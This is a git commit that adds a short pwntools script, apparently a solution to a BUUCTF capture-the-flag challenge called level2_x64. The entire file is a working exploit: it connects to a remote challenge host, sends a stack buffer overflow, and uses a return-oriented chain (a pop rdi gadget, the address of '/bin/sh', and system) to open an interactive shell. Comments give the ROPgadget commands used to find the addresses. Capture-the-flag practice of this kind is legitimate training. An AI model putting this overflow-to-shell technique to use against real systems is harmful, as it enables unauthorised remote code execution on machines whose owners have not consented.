251aa18b88ecc315fb5d2562092a17b5388782df
谭尧丹 <tanyaodan@qq.com>
2021-11-22 14:52:46 +0800

    Create level2_x64.py

---
+++ BUUCTF/level2_x64.py
@@ -0,0 +1,14 @@
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 27561)
+e = ELF('./level2_x64')
+system_address = e.symbols['system'] # 0x4004C0
+# ROPgadget --binary ./level2_x64 --string "/bin/sh"
+bin_sh_address = 0x600A90
+# ROPgadget --binary ./level2_x64 --only "pop|ret"
+pop_rdi = 0x4006B3
+payload = b'a'*0x80 + b'fuckpwn!'
+payload += p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
+io.sendlineafter(b'Input:\n', payload)
+io.interactive()
